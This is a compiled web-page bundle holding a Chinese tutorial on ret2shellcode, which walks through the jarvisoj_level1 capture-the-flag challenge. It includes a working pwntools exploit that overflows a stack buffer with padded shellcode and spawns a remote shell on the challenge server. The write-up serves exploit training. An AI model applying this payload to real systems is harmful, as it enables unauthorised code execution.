(window.webpackJsonp=window.webpackJsonp||[]).push([[43],{773:function(s,t,a){"use strict";a.r(t);var n=a(103),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"原理"}},[s._v("原理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[s._v("#")])]),s._v(" "),a("p",[s._v("篡改栈帧上的返回地址为攻击者手动传入的shellcode所在缓冲区地址，并且该区域有执行权限。")]),s._v(" "),a("h2",{attrs:{id:"例题"}},[s._v("例题 "),a("a",{staticClass:"header-anchor",attrs:{href:"#例题"}},[s._v("#")])]),s._v(" "),a("p",[s._v("jarvisoj_level1，可在jarvisoj网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关，栈可执行。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2shellcode/1.jpg",alt:"1.jpg"}})]),s._v(" "),a("p",[s._v("一样的使用ida查看一下该程序，在危险函数中，程序向我们输出了一个栈站上的地址因此我们可以朝buf写一段shellcode，然后\n将返回地址覆盖为buf的地址。在pwntools中可以使用shellcraft.sh()写shellcode，再使用asm将其转换成机器码。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2shellcode/2.jpg",alt:"2.jpg"}})]),s._v(" "),a("p",[s._v("ida帮我们计算出来了buf字符串距离rbp有0x88个字节，由于ebp本身还占4个字节，所以溢出0x8c个字节后将返回地址修改为buf地址，python有\n个自带的方法ljust可以将我们的shellcode长度补充为固定字节，期作用是使shellcode左对齐，然后不足长度补齐指定数据。")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#p = process('./level1')")]),s._v("\np "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'pwn2.jarvisoj.com'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9877")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ns "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" p"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\naddr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("bytes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("decode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nshellcode "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" asm"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("shellcraft"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" shellcode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("ljust"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x8c")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'A'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);